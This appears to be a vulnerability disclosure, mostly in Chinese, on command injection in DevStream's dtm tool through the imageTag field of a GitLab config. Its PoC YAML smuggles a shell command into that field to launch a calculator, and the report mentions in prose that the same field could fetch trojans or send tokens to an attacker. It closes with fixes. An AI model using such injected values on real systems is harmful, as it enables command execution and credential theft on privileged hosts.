## POC

```yaml
---
# core config
varFile: "" # If not empty, use the specified external variables config file
toolFile: "" # If not empty, use the specified external tools config file
pluginDir: "" # If empty, use the default value: ~/.devstream/plugins, or use -d flag to specify a directory
state: # state config, backend can be local, s3 or k8s
  backend: local
  options:
    stateFile: devstream.state
---
# tools config
tools:
  # name of the tool
  - name: gitlab-ce-docker
    # id of the tool instance
    instanceID: default
    # format: name.instanceID; If specified, dtm will make sure the dependency is applied first before handling this tool.
    dependsOn: [ ]
    # options for the plugin
    options:
      # hostname for running docker. (default: gitlab.example.com)
      hostname: gitlab.example.com
      # pointing to the directory where the configuration, logs, and data files will reside.
      # (default: /srv/gitlab)
      # 1. it should be a absolute path
      # 2. once the tool is installed, it can't be changed
      gitlabHome: /tmp
      # ssh port exposed in the host machine. (default: 22)
      sshPort: 22
      # http port exposed in the host machine. (default: 80)
      httpPort: 80
      # https port exposed in the host machine.
      # (default: 443)
      # todo: support https, reference: https://docs.gitlab.com/omnibus/settings/nginx.html#enable-https
      httpsPort: 443
      # whether to delete the gitlabHome directory when the tool is removed. (default: false)
      rmDataAfterDelete: false
      # gitlab-ce tag. (default: "rc")
      # imageTag: "rc"
      imageTag: "rc;open /System/Applications/Calculator.app #"

```

利用方法为 gitlab ce image 没用启动对应 Container 的时候，执行 `dtm apply -f this.yaml -y` 之后弹出计算器

imageTag 无过滤内容 可用退隔和 rewind 以及 # 注释符号搭配使用，对用户进行欺骗

## 危害

**首先配置文件本身并没有被项目做权限检查（例如 ssh 下 id_rsa 权限）存在可以被其他平级乃至是低权限用户修改的可能。因此提供了一种从文本写入到命令执行的攻击向量。**

其次，项目多处使用了 `docker` `kubectl` 。这类需要 root 或者 docker 组的权限的用户进行执行。**因此往往 dtm 是被高权限使用的。**

由于项目的目的是构造整体的生产环境工具链，也同样聚集了多数最佳实践的配置，同时又支持环境变量或者其他文件读取配置，**所以用户可能并不会对配置文件本身亲力亲为。**

也存在一种场景，假设**用户配置文件可以通过远程分发和维护**的时候，例如 nacos 统一配置全公司的技术栈和工具链，通过这种配置文件的污染，（能够进行污染的时候，部署的服务和CICD服务可能均已遭到不测），甚至可以导致员工的办公区电脑被入侵。

当然命令这里不只是 Open 计算器，由于ImageTag中没有多数的过滤，所以我们几乎可以做任何操作，包括但不限于下载木马文件进行执行，并且由于教程中含有通过环境变量的值的方法传入各种 Token 所以也存在使用 curl 或者其他方法向黑客的恶意 Webhook 服务器发送带有生产或是测试环境的相关的配置从而造成更大的危害。

## 可行的缓解与修复

可以使用 go client for docker engine 实现。

如果非要使用 exec.Command 可以将第一位二进制参数设置为 docker 替换  sh -c 便会大大降低被注入额外命令的风险

